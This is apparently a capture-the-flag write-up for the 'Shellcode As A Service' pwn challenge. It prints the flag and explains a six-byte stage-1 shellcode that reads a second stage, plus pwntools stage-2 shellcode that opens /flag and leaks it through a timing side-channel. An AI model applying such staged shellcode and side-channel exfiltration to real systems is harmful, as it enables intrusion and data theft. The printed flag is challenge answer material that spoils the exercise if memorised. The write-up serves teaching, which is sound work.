# Shellcode As A Service

**Author**: zeyu2001

**Category**: Pwn

Flag: `SEE{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}`

## Description

Hey, welcome to my new SaaS platform! As part of our early access program, we are offering the service for FREE. Our generous free tier gives you a whole SIX BYTES of shellcode to run on our server. What are you waiting for? Sign up now!

## Difficulty

Easy

## Solution

The program only reads 6 bytes of shellcode before executing it. Only two syscalls are allowed - `open` and `read`.

To get past the 6-byte limit, we can read a 2nd-stage payload by using `read()` to read more shellcode from `stdin` into somewhere where we can then execute it.

In the disassembly, we can see that `rdx` is already set to the address of our shellcode. Therefore, we can simply use the value in `rdx` as our 2nd argument (`mov esi, edx`).

```
0x00005653ecfdc3ab <+514>:   mov    rax,QWORD PTR [rip+0x2cae]        # 0x5653ecfdf060 <shellcode_mem>
0x00005653ecfdc3b2 <+521>:   mov    rdx,rax
0x00005653ecfdc3b5 <+524>:   mov    eax,0x0
0x00005653ecfdc3ba <+529>:   call   rdx
```

We don't have to change the 3rd argument, since we can just use the value already in `rdx`.

Here's our stage 1 shellcode:

```
xor edi, edi
mov esi, edx
syscall
```

Since we can only use `open` and `read`, we can't simply write the flag to `stdout`. Instead, we need to leak the flag using some kind of side-channel. To do this, we can read the flag bit by bit and create an infinite loop if the bit is 1, and do nothing if the bit is 0.

```python
stage2 = asm(("""
.rept 0x6
nop
.endr
""" 
    + shellcraft.amd64.linux.open('/flag')
    + shellcraft.amd64.linux.read('rax', 'rsp', 0x100)
    + f"""
    xor r11, r11
    xor rax, rax
    mov al, [rsp+{offset}]
    shr al, {bit_offset}
    shl al, 7
    shr al, 7
loop:
    cmp rax, r11
    je end
    jmp loop
end:
"""
), arch='amd64')
```

This timing difference can then be easily detected by how long the TCP connection remains open.

Solve script [here](solve/solve.py).